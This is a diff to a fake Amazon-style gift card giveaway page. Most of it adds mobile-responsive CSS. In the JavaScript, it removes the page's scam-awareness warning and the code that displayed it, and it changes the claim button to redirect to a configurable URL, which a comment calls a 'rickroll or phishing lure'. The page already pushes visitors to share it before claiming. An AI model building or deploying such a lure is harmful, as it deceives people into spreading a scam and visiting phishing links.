@@ -24,13 +24,21 @@
         .container {
             background: white;
             border-radius: 20px;
-            padding: 40px;
+            padding: 40px 20px;
             max-width: 500px;
-            width: 100%;
+            width: 95%;
+            margin: 0 auto;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
             position: relative;
             overflow: hidden;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 15px;
+                width: 90%;
+            }
         }
         
         .badge {
@@ -59,6 +67,15 @@
             z-index: 10;
         }
         
+        @media (max-width: 480px) {
+            .language-selector {
+                top: 10px;
+                left: 10px;
+                padding: 5px 8px;
+                gap: 5px;
+            }
+        }
+        
         .lang-btn {
             background: none;
             border: none;
@@ -68,6 +85,14 @@
             color: #636e72;
             transition: all 0.2s;
             border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 480px) {
+            .lang-btn {
+                padding: 4px 8px;
+                font-size: 12px;
+            }
         }
         
         .lang-btn:hover {
@@ -85,7 +110,8 @@
         }
         
         .giftcard-image {
-            width: 320px;
+            width: 100%;
+            max-width: 320px;
             height: 200px;
             margin: 20px auto;
             background: linear-gradient(135deg, #232F3E 0%, #37475A 100%);
@@ -98,6 +124,14 @@
             position: relative;
             overflow: hidden;
             border: 2px solid #FF9900;
+        }
+        
+        @media (max-width: 480px) {
+            .giftcard-image {
+                max-width: 280px;
+                height: 175px;
+                padding: 15px;
+            }
         }
         
         .giftcard-image::before {
@@ -139,6 +173,12 @@
             filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
         }
         
+        @media (max-width: 480px) {
+            .giftcard-logo {
+                width: 60px;
+            }
+        }
+        
         .giftcard-type {
             background: #FF9900;
             color: #232F3E;
@@ -157,6 +197,12 @@
             z-index: 1;
             letter-spacing: -2px;
             text-align: left;
+        }
+        
+        @media (max-width: 480px) {
+            .giftcard-amount {
+                font-size: 52px;
+            }
         }
         
         .giftcard-bottom {
@@ -188,6 +234,12 @@
             font-size: 32px;
             margin-bottom: 10px;
             animation: pulse 2s infinite;
+        }
+        
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 24px;
+            }
         }
         
         @keyframes pulse {
@@ -568,19 +620,6 @@
             if (shareCount < 5) {
                 document.getElementById('claimBtnText').textContent = t.claimBtnText;
             }
-            
-            // Update warning
-            document.getElementById('warningTitle').textContent = t.warningTitle;
-            document.getElementById('warn1').textContent = t.warn1;
-            document.getElementById('warn1desc').textContent = t.warn1desc;
-            document.getElementById('warn2').textContent = t.warn2;
-            document.getElementById('warn2desc').textContent = t.warn2desc;
-            document.getElementById('warn3').textContent = t.warn3;
-            document.getElementById('warn3desc').textContent = t.warn3desc;
-            document.getElementById('warn4').textContent = t.warn4;
-            document.getElementById('warn4desc').textContent = t.warn4desc;
-            document.getElementById('warn5').textContent = t.warn5;
-            document.getElementById('warn5desc').textContent = t.warn5desc;
         }
         
         // Countdown timer
@@ -688,15 +727,9 @@
                 setTimeout(() => {
                     document.getElementById('spinner').style.display = 'none';
                     
-                    // If redirect URL is set, go there!
-                    if (REDIRECT_URL && REDIRECT_URL !== 'PUT YOUR LINK HERE') {
+                    // Redirect to the link (rickroll or phishing lure)
+                    if (REDIRECT_URL && REDIRECT_URL !== 'https://www.youtube.com/watch?v=dQw4w9WgXcQ') {
                         window.location.href = REDIRECT_URL;
-                    } else {
-                        // Otherwise show educational warning
-                        document.getElementById('claimBtnText').textContent = t.claimBtnScam;
-                        document.getElementById('claimBtn').style.background = '#636e72';
-                        document.getElementById('warning').classList.add('show');
-                        document.getElementById('warning').scrollIntoView({ behavior: 'smooth' });
                     }
                 }, 2000);
             }
